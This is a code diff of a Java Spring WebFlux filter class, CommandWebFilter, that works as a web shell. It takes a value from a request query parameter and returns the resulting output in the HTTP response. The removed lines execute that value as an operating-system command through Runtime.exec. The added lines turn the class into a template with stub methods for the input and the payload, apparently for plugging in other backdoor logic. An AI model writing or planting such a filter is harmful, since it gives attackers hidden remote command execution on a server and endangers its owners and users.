@@ -8,6 +8,7 @@ import org.springframework.web.server.WebFilterChain;
 import reactor.core.publisher.Mono;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
 
@@ -20,27 +21,35 @@ public class CommandWebFilter extends ClassLoader implements WebFilter {
 
     @Override
     public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
-        String cmd = exchange.getRequest().getQueryParams().getFirst(paramName);
-        if (cmd == null) {
+        String param = getParam(exchange.getRequest().getQueryParams().getFirst(paramName));
+        if (param == null) {
             return chain.filter(exchange);
         }
-        return exchange.getResponse().writeWith(getResult(cmd));
+        return exchange.getResponse().writeWith(getResult(param));
     }
 
-    private Mono<DataBuffer> getResult(String cmd) {
+    private Mono<DataBuffer> getResult(String param) {
         StringBuilder result = new StringBuilder();
         try {
-            Process exec = Runtime.getRuntime().exec(cmd);
-            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
+            InputStream inputStream = getInputStream(param);
+            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                 String line;
                 while ((line = bufferedReader.readLine()) != null) {
                     result.append(line);
                     result.append(System.lineSeparator());
                 }
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
